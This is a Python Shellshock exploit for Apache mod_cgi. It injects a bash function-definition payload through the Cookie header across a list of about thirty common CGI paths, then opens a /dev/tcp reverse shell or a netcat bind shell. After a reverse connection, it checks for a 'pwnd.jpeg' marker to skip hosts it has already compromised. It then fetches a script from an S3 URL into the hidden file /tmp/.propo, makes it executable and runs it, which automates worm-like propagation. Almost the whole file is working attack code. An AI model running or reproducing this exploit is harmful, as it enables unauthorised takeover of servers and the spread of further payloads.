#!/usr/bin/env python3
from socket import *
import _thread, time, sys
import requests as req

stop = False
proxyhost = ""
proxyport = 0

def usage():
	print ("""

		Shellshock apache mod_cgi remote exploit

Usage:
./exploit.py var=<value>

Vars:
rhost: victim host
rport: victim port for TCP shell binding
lhost: attacker host for TCP shell reversing
lport: attacker port for TCP shell reversing
pages:  specific cgi vulnerable pages (separated by comma)
proxy: host:port proxy

Payloads:
"reverse" (unix unversal) TCP reverse shell (Requires: rhost, lhost, lport)
"bind" (uses non-bsd netcat) TCP bind shell (Requires: rhost, rport)

Example:

./exploit.py payload=reverse rhost=1.2.3.4 lhost=5.6.7.8 lport=1234
./exploit.py payload=bind rhost=1.2.3.4 rport=1234

Credits:

Federico Galatolo 2014
Marcus Agard, Robert Unnold 2020
""")
	sys.exit(0)

def exploit(lhost,lport,rhost,rport,payload,pages):
	headers = {"Cookie": payload,}

	for page in pages:
		if stop:
			return
		print(f"[-] Trying exploit on: {page}")
		resp = req.get(f"http://{rhost}{page}", headers=headers)
		if resp.status_code == 404:
			print(f"[*] 404 on: {page}")
		else:
			break
		time.sleep(1)

def shockshell(payload,lhost,lport,rhost):

	if payload == 'reverse':
		try:
			payload = "() { :;}; /bin/bash -c /bin/bash -i >& /dev/tcp/"+lhost+"/"+str(lport)+" 0>&1 2>&1 &"
		except:
			usage()
	elif payload == 'bind':
		try:
			payload = "() { :;}; /bin/bash -c 'nc -l -p "+rport+" -e /bin/bash &'"
		except:
			usage()
	else:
		print("[*] Unsupported payload")
		usage()

	pages = ["/cgi-sys/entropysearch.cgi",
			"/cgi-sys/defaultwebpage.cgi",
			"/cgi-mod/index.cgi",
			"/cgi-bin/test.cgi",
			"/cgi-bin-sdb/printenv",
			"/cgi-bin/bash",
			"/cgi-bin/contact.cgi",
			"/cgi-bin/defaultwebpage.cgi",
			"/cgi-bin/env.cgi",
			"/cgi-bin/fire.cgi",
			"/cgi-bin/forum.cgi",
			"/cgi-bin/hello.cgi",
			"/cgi-bin/index.cgi",
			"/cgi-bin/login.cgi",
			"/cgi-bin/main.cgi",
			"/cgi-bin/meme.cgi",
			"/cgi-bin/php",
			"/cgi-bin/php4",
			"/cgi-bin/php5",
			"/cgi-bin/php5-cli",
			"/cgi-bin/recent.cgi",
			"/cgi-bin/sat-ir-web.pl",
			"/cgi-bin/status",
			"/cgi-bin/test-cgi",
			"/cgi-bin/test.cgi",
			"/cgi-bin/test-cgi.pl",
			"/cgi-bin/test.sh",
			"/cgi-bin/tools/tools.pl",
			"/cgi-sys/php5",
			"/phppath/cgi_wrapper",
			"/phppath/php",]

	if payload == 'reverse':
		serversocket = socket(AF_INET, SOCK_STREAM)
		buff = 1024
		addr = (lhost, lport)
		serversocket.bind(addr)
		serversocket.listen(10)
		print("[!] Started reverse shell handler")
		_thread.start_new_thread(exploit,(lhost,lport,rhost,0,payload,pages,))
	if payload == 'bind':
		serversocket = socket(AF_INET, SOCK_STREAM)
		addr = (rhost,int(rport))
		_thread.start_new_thread(exploit,("",0,rhost,rport,payload,pages,))

	buff = 1024

	while True:
		if payload == 'reverse':
			clientsocket, clientaddr = serversocket.accept()
			print("[!] Successfully exploited")
			print(f"[!] Incoming connection from {clientaddr[0]}")
			# Hands off keyboard exploitation
			stop = True
			clientsocket.settimeout(100)
			print("[-] Testing if target has already been exploited...")
			clientsocket.sendall("find / -name pwnd.jpeg".encode())
			time.sleep(1)
			try:
				data = clientsocket.recv(buff)
			except:
				# No data == not found, keep moving
				pass
			else:
				print("[!] Already pwned this one! Quitting...")
				sys.exit(0)
			print("[-] Obtaining propo...")
			# These links may change as we update the files
			clientsocket.sendall("curl https://genestealer-demo.s3.amazonaws.com/propo.sh --output /tmp/.propo --silent\n".encode())
			time.sleep(3)
			print("[-] Changing propo file mode...")
			clientsocket.sendall("chmod +x /tmp/.propo\n".encode())
			time.sleep(1)
			print("[-] Checking existence and executability of propo...")
			clientsocket.sendall("ls /tmp -al | grep .propo\n".encode())
			time.sleep(1)
			data = clientsocket.recv(buff)
			print(data.decode())
			if "-rwxr-xr-x" not in data.decode():
				print("Catastrophic failure!!!!!")
			else:
				clientsocket.sendall("/tmp/.propo\n".encode())
				clientsocket.close()
			sys.exit(0)
		# Bind shell is less stable, so we won't implement for it
		if payload == 'bind':
			try:
				serversocket = socket(AF_INET, SOCK_STREAM)
				time.sleep(1)
				serversocket.connect(addr)
				print("[!] Successfully exploited")
				print(f"[!] Connected to {rhost}")
				stop = True
				serversocket.settimeout(3)
				while True:
					reply = input(f"{rhost}> ")
					serversocket.sendall(f"{reply}\n".encode())
					data = serversocket.recv(buff)
					print(data.decode())
			except:
				pass
